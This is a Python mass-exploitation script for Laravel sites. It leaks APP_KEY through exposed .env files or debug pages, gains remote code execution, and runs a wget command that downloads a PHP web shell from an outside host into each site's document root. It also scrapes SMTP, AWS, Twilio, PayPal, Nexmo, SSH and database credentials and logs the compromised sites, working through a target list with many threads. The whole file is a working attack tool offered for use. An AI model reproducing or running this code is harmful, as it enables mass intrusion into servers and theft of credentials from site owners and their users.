import os
import re
import sys
import paramiko
import requests
import traceback
import threading
requests.packages.urllib3.disable_warnings()

# --- MODULE MANUAL --- #
import lrce
import grabber

try:
	os.mkdir('v2')
except:
	pass

def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def printf(text):
	''.join([str(item) for item in text])
	print(text + '\n'),

def main(url):
	grab = grabber.configgrabber()
	resp = False
	try:
		text = '\033[32;1m#\033[0m '+url
		headers = {'User-agent':'IDBTE4M CODE87'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=3, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
		else:
			get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=3, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
				resp = get_source
		if resp:
			# -- exploit rce --#
			if "<td>APP_KEY</td>" in resp:
				appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", get_source)[0]
			elif "APP_KEY=" in resp:
				appkey = re.findall("\nAPP_KEY=(.*?)\n", get_source)[0]
			else:
				appkey = False
			if appkey:
				#-- cek vun
				
				rce = lrce.rce(url)
				rce.appkey = appkey.replace('base64:', '').strip()
				rce.cmd = "echo 'idbte4m'"
				try:
					vuln = rce.exploit()
					if 'idbte4m' in vuln:
						#-- get document root
						text += ' | \033[32;1mRCE\033[0m'
						fp = open('rce.txt', 'a')
						fp.write('{}\n'.format(url))
						fp.close()
						if "<td>APP_KEY</td>" in resp:
							root = re.findall("<td>DOCUMENT_ROOT<\/td>\s+<td><pre.*>(.*?)<\/span>", resp)[0]
						else:
							rce.cmd = "php -r 'phpinfo();'"
							tes = rce.exploit()
							if tes and 'DOCUMENT_ROOT' in tes:
								root = re.findall(r"DOCUMENT_ROOT(.*)", tes)
								if root:
									root = root[0].replace('=', '').replace('>', '').strip()
						if root:
							# -- check vuln ---#
							rce = lrce.rce(url)
							print("EXploiting rce")
							cmd = 'wget -c https://pejoh.co/rce.txt -O {root}/z.php'.format(root=root)
							rce.cmd = cmd
							rce.exploit()
							try:
								shell = '{}/z.php'.format(url)
								get = requests.get(shell)
								if 'idbte4m' in get.text.lower():
									text += ' | \033[32;1mSHELL\033[0m'
									fp = open('v2/shell.txt', 'a+')
									fp.write('{}\r\n'.format(shell))
									fp.close()
								else:
									text += ' | \033[31;1mSHELL\033[0m'
							except:
								# traceback.print_exc()
								text += ' | \033[31;1mSHELL\033[0m'
					else:
						text += ' | \033[31;1mRCE\033[0m'
				except:
					text += ' | \033[31;1mRCE\033[0m'
			
			
			#------------------#
			
			getdabatase = grab.get_database(resp, url)
			getsmtp 	= grab.get_smtp(resp, url)
			getwtilio 	= grab.get_twillio(resp, url)
			getaws 		= grab.get_aws_data(resp, url)
			getpp 		= grab.paypal(resp, url)
			getnexmo	= grab.get_nexmo(resp, url)
			getssh 		= grab.getSSH(resp, url)
			if getsmtp:
				text += ' | \033[32;1mSMTP\033[0m'
			else:
				text += ' | \033[31;1mSMTP\033[0m'
			if getaws:
				text += ' | \033[32;1mAWS\033[0m'
			else:
				text += ' | \033[31;1mAWS\033[0m'
			if getwtilio:
				text += ' | \033[32;1mTWILIO\033[0m'
			else:
				text += ' | \033[31;1mTWILIO\033[0m'
			if getpp:
				text += ' | \033[32;1mPAYPAL\033[0m'
			else:
				text += ' | \033[31;1mPAYPAL\033[0m'
			if getnexmo:
				text += ' | \033[32;1mNEXMO\033[0m'
			else:
				text += ' | \033[31;1mNEXMO\033[0m'
			if getssh:
				text += ' | \033[32;1mSSH {}\033[0m'.format(getssh)
			else:
				text += ' | \033[31;1mSSH\033[0m'
			if getdabatase:
				text += ' | \033[32;1mPHPMYADMIN\033[0m'
			else:
				text += ' | \033[31;1mPHPMYADMIN\033[0m'

			'''
			if getappkey or getsmtp or getaws or getwtilio or getpp or getnexmo or getssh:
				try:
					os.mkdir('vuln')
				except:
					pass
				hostnya = url.split("//")[-1].split("/")[0].split('?')[0]
				fp = open('vuln/{host}.txt'.format(host=hostnya), 'a')
				fp.write(resp)
				fp.close()
			'''
		else:
			text += ' | \033[31;1mCan\'t get everything\033[0m'
			save = open('v2/not_vulnerable.txt','a')
			asu = str(url).replace('\r', '')
			save.write(asu+'\n')
			save.close()
	except:
		traceback.print_exc()
		text = '\033[31;1m#\033[0m '+url
		text += ' | \033[31;1mCan\'t access sites\033[0m'
		save = open('v2/not_vulnerable.txt','a')
		asu = str(url).replace('\r', '')
		save.write(asu+'\n')
		save.close()
	printf(text)


if __name__ == '__main__':
	try:
		lists = sys.argv[1]
		tread = int(sys.argv[2])
		allsite = open(lists).read()
		allsite = allsite.splitlines()
		allsite = chunks(allsite, tread)
		for sites in allsite:
			jumlah = len(sites)
			print("Exploiting {} site".format(jumlah))
			threads = []
			for site in sites:
				site = site.strip().lower()
				if site:
					if '://' not in site:
						site = 'http://{}'.format(site)
					args = (site, )
					t = threading.Thread(target=main, args=args)
					threads.append(t)
			if threads:
				for t in threads:
					t.start()
				for t in threads:
					t.join()
			print("Exploiting {} site done...".format(jumlah))
			
	except:
		traceback.print_exc()

